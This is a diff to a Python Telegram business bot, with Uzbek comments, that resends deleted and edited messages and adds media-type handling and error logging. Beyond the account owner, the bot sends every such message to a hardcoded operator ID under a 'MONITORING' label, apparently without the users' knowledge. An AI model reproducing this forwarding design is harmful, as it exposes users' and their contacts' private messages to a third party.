@@ -186,7 +186,7 @@ async def on_edit(m: Message):
             await bot.send_message(OWNER_ID, f"🕵️ **MONITORING** ({old['owner_name']}):\n{text}")
     await on_msg(m)
 
-@dp.deleted_business_messages()
+@dp.business_messages_deleted()
 async def on_delete(ev: BusinessMessagesDeleted):
     db = get_db(CONFIG["DATABASE_NAME"])
     for mid in ev.message_ids:
@@ -197,16 +197,34 @@ async def on_delete(ev: BusinessMessagesDeleted):
             
             async def send_all(chat_id, caption, is_admin=False):
                 prefix = f"🕵️ **MONITORING** ({old['owner_name']})\n" if is_admin else ""
+                full_caption = prefix + caption
                 try:
-                    if old["type"] == "text" or not old["file_id"]: await bot.send_message(chat_id, prefix + caption)
+                    mt = old["type"]
+                    fid = old["file_id"]
+                    
+                    if mt == "text" or not fid:
+                        await bot.send_message(chat_id, full_caption)
+                    elif mt in ["sticker", "video_note"]:
+                        # Bu turlar caption qo'llab-quvvatlamaydi
+                        m_func = getattr(bot, f"send_{mt}")
+                        await m_func(chat_id, fid)
+                        await bot.send_message(chat_id, full_caption)
                     else:
-                        m_func = getattr(bot, f"send_{old['type']}")
-                        await m_func(chat_id, old["file_id"], caption=prefix + caption)
-                except: pass
+                        # Photo, video, document, voice, audio, animation
+                        m_func = getattr(bot, f"send_{mt}")
+                        await m_func(chat_id, fid, caption=full_caption)
+                except Exception as e:
+                    logging.error(f"Xabar yuborishda xato: {e}")
+                    # Xatolik bo'lsa ham hech bo'lmasa matnni yuboramiz
+                    try:
+                        await bot.send_message(chat_id, full_caption)
+                    except: pass
 
             await send_all(old["owner_id"], cap)
             if old["owner_id"] != OWNER_ID:
                 await send_all(OWNER_ID, cap, True)
+        else:
+            logging.warning(f"O'chirilgan xabar bazadan topilmadi: {key}")
 
 if __name__ == "__main__":
     Thread(target=run_web).start()
